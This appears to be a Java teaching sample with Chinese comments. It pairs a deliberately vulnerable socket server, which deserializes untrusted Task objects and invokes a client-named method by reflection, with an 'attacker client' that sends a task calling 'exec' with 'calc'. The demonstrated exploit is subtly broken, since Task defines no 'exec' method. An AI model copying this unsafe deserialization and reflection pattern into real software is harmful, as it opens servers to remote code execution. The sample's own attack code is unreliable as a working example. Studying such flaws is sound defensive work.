import java.io.*;
import java.lang.reflect.Method;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

// 任务管理系统核心类
class Task implements Serializable {
    private String taskName;
    private String methodName;
    private Object[] args;

    public Task(String taskName, String methodName, Object[] args) {
        this.taskName = taskName;
        this.methodName = methodName;
        this.args = args;
    }

    public void execute() throws Exception {
        Class<?> clazz = this.getClass();
        Method method = clazz.getDeclaredMethod(methodName, getParameterTypes(args));
        method.invoke(this, args);
    }

    private Class<?>[] getParameterTypes(Object[] args) {
        Class<?>[] paramTypes = new Class<?>[args.length];
        for (int i = 0; i < args.length; i++) {
            paramTypes[i] = args[i].getClass();
        }
        return paramTypes;
    }

    public void displayTaskInfo() {
        System.out.println("[任务信息] " + taskName);
    }
}

// 漏洞服务端
public class TaskServer {
    public static void main(String[] args) {
        try (ServerSocket serverSocket = new ServerSocket(9090)) {
            System.out.println("任务服务器启动在9090端口...");
            while (true) {
                Socket socket = serverSocket.accept();
                ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                Task task = (Task) ois.readObject(); // 不安全的反序列化
                task.execute(); // 元编程：反射执行任意方法
                socket.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

// 攻击者客户端示例
class MaliciousClient {
    public static void main(String[] args) throws Exception {
        Socket socket = new Socket("localhost", 9090);
        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
        // 构造恶意任务
        Task evilTask = new Task("恶意任务", "exec", new Object[]{"calc"});
        oos.writeObject(evilTask);
        socket.close();
    }
}